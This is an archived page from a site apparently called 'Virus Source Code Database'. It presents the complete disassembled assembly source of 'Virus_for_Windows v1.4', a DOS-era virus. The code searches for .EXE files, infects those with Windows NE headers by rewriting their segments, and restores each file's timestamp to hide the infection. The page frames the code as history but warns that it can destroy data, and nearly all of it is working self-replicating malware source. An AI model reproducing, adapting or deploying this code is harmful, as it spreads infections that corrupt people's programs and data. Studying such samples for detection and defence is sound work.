<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: wvir14a_asm</title>
<meta name="KEYWORDS" content="wvir14a.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for wvir14a.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€					                                 €€
;€€				WVIR14	                                 €€
;€€					                                 €€
;€€      Created:   1-Sep-92		                                 €€
;€€      Passes:    5          Analysis	Options on: none                 €€
;€€					                                 €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_11e	equ	100h			;*
data_12e	equ	140h			;*
data_13e	equ	142h			;*
data_14e	equ	144h			;*
data_15e	equ	148h			;*
data_16e	equ	14Ah			;*
data_17e	equ	150h			;*
data_18e	equ	16Eh			;*
data_19e	equ	181h			;*
data_20e	equ	19Ch			;*
data_21e	equ	19Eh			;*
data_22e	equ	1A0h			;*
data_23e	equ	1A2h			;*

;------------------------------------------------------------  seg_a   ----

seg_a		segment	byte public
		assume cs:seg_a  , ds:seg_a  , ss:stack_seg_b

		db	249 dup (0)

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       Program	Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€


wvir14		proc	far

start:
		mov	ax,cs
		add	ax,3Bh
		mov	ds,ax
		cld				; Clear direction
		push	es
		push	ds
		pop	es
		mov	si,data_18e
		mov	di,data_19e
		mov	cx,0Dh
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	dx,data_17e
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA(disk xfer area) ds:dx
		mov	dx,17Bh
		xor	cx,cx			; Zero register
		mov	ah,4Eh
loc_1:
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jc	loc_2			; Jump if carry Set
		mov	dx,data_18e
		call	sub_1
		mov	ah,4Fh			; 'O'
		jmp	short loc_1
loc_2:
		mov	dx,data_19e
		call	sub_2
		pop	es
		mov	ax,4C00h
		int	21h			; DOS Services  ah=function 4Ch
						;  terminate with al=return code

wvir14		endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1		proc	near
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_ret_4		; Jump if carry Set
		xchg	ax,bx
		mov	si,100h
		call	sub_3
		jc	loc_3			; Jump if carry Set
		cmp	word ptr [si+14h],100h
		je	loc_3			; Jump if equal
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		push	cx
		push	dx
		call	sub_4
		pop	dx
		pop	cx
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
loc_3:
		mov	ah,3Eh
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle

loc_ret_4:
		retn
sub_1		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2		proc	near
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		jc	loc_ret_4		; Jump if carry Set
		xchg	ax,bx
		mov	si,100h
		call	sub_3
		jc	loc_3			; Jump if carry Set
		cmp	word ptr [si+14h],100h
		jne	loc_3			; Jump if not equal
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get file date+time, bx=handle
						;   returns cx=time, dx=time
		push	cx
		push	dx
		call	sub_5
		call	sub_6
		pop	dx
		pop	cx
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  set file date+time, bx=handle
						;   cx=time, dx=time
		jmp	short loc_3
sub_2		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3		proc	near
		call	sub_8
		cmp	word ptr [si],5A4Dh
		jne	loc_5			; Jump if not equal
		cmp	word ptr [si+18h],40h
		jb	loc_5			; Jump if below
		mov	ax,[si+3Ch]
		mov	dx,[si+3Eh]
		call	sub_16
		mov	ds:data_20e,ax
		mov	ds:data_21e,dx
		call	sub_8
		cmp	word ptr [si],454Eh
		jne	loc_5			; Jump if not equal
		cmp	word ptr [si+0Ch],302h
		jne	loc_5			; Jump if not equal
		cmp	byte ptr [si+32h],4
		jne	loc_5			; Jump if not equal
		cmp	word ptr [si+36h],802h
		jne	loc_5			; Jump if not equal
		clc				; Clear carry flag
		retn
loc_5:
		stc				; Set carry flag

loc_ret_6:
		retn
sub_3		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4		proc	near
		mov	ax,[si+16h]
		mov	dx,140h
		call	sub_7
		cmp	word ptr ds:data_13e,3AEh
		jb	loc_ret_6		; Jump if below
		cmp	byte ptr ds:data_14e,50h	; 'P'
		jne	loc_ret_6		; Jump if not equal
		mov	ax,[si+0Eh]
		mov	dx,148h
		call	sub_7
		cmp	word ptr ds:data_16e,4A8h
		jb	loc_ret_6		; Jump if below
		mov	ax,ds:data_12e
		call	sub_15
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_9
		call	sub_13
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_12
		mov	ax,word ptr ds:[148h]
		call	sub_15
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_9
		call	sub_13
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_12
		push	word ptr ds:[144h]
		pop	word ptr ds:[1A2h]
		and	word ptr ds:[144h],0FEFFh
		mov	ax,[si+16h]
		mov	dx,140h
		call	sub_10
		xor	ax,ax			; Zero register
		cwd				; Word to double word
		call	sub_14
		push	word ptr [si+14h]
		pop	word ptr ds:[1A0h]
		mov	word ptr [si+14h],100h
		call	sub_11
		mov	ax,word ptr ds:[140h]
		call	sub_15
		push	ds
		push	cs
		pop	ds
		mov	dx,100h
		mov	cx,2AEh
		nop
		call	sub_12
		pop	ds
		mov	ax,word ptr ds:[148h]
		call	sub_15
		mov	dx,100h
		mov	cx,0A8h
		nop
		call	sub_12
		retn
sub_4		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_5		proc	near
		mov	ax,[si+0Eh]
		mov	dx,148h
		call	sub_7
		mov	ax,ds:data_15e
		call	sub_15
		mov	dx,100h
		mov	cx,0A8h
		nop
		call	sub_9
		retn
sub_5		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6		proc	near
		push	word ptr ds:data_23e
		pop	word ptr ds:data_14e
		mov	ax,[si+16h]
		mov	dx,140h
		call	sub_10
		push	word ptr ds:data_22e
		pop	word ptr [si+14h]
		xor	ax,ax			; Zero register
		cwd				; Word to double word
		call	sub_14
		call	sub_11
		call	sub_13
		sub	ax,0A8h
		nop
		sbb	dx,0
		push	ax
		push	dx
		call	sub_16
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_9
		mov	ax,ds:data_15e
		call	sub_15
		mov	dx,1A8h
		mov	cx,0A8h
		nop
		call	sub_12
		pop	dx
		pop	ax
		sub	ax,2AEh
		nop
		sbb	dx,0
		push	ax
		push	dx
		call	sub_16
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_9
		mov	ax,word ptr ds:[140h]
		call	sub_15
		mov	dx,1A8h
		mov	cx,2AEh
		nop
		call	sub_12
		pop	dx
		pop	ax
		call	sub_16
		mov	cx,0
		call	sub_12
		retn
sub_6		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_7		proc	near
		push	dx
		dec	ax
		mov	cx,8
		mul	cx			; dx:ax = reg * ax
		add	ax,[si+22h]
		adc	dx,0
		call	sub_14
		pop	dx
		mov	cx,8
		jmp	short loc_7

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_8:
		mov	dx,data_11e
		mov	cx,40h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_9:
loc_7:
		mov	ah,3Fh
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, bx=file handle
						;   cx=bytes to ds:dx buffer
		retn
sub_7		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_10		proc	near
		push	dx
		dec	ax
		mov	cx,8
		mul	cx			; dx:ax = reg * ax
		add	ax,[si+22h]
		adc	dx,0
		call	sub_14
		pop	dx
		mov	cx,8
		jmp	short loc_8

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_11:
		mov	dx,data_11e
		mov	cx,40h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_12:
loc_8:
		mov	ah,40h
		int	21h			; DOS Services  ah=function 40h
						;  write file  bx=file handle
						;   cx=bytes from ds:dx buffer
		retn
sub_10		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_13		proc	near
		mov	ax,4202h
		xor	cx,cx			; Zero register
		cwd				; Word to double word
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
sub_13		endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_14		proc	near
		add	ax,ds:data_20e
		adc	dx,ds:data_21e
		jmp	short loc_9

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_15:
		mov	cx,10h
		mul	cx			; dx:ax = reg * ax
		add	ax,100h
		adc	dx,0
		jmp	short loc_9
		db	 33h,0C0h, 99h

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_16:
loc_9:
		xchg	cx,dx
		xchg	ax,dx
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
sub_14		endp

			                        ;* No entry point to code
		xchg	cx,dx
		xchg	ax,dx
		mov	ax,4201h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, bx=file handle
						;   al=method, cx,dx=offset
		retn
		db	' Virus_for_Windows  v1.4 '
		db	259 dup (0)
		db	'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
		db	'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
		db	'bbbbbbbbccccccccdddddddddddddddd'
		db	'ddddddddddddddddddddddddddd*.EXE'
		db	0
		db	'eeeeeeeeeeeee'
		db	 00h, 00h, 80h, 00h, 00h, 00h
		db	 5Ch, 00h, 00h, 00h
		db	6Ch
		db	11 dup (0)
		db	 4Dh, 4Bh, 39h, 32h
		db	8 dup (0)

seg_a		ends



;------------------------------------------------------  stack_seg_b   ----

stack_seg_b	segment	word stack 'STACK'

		db	8192 dup (0)

stack_seg_b	ends



		end	start

</textarea></td></tr></table></body></html>
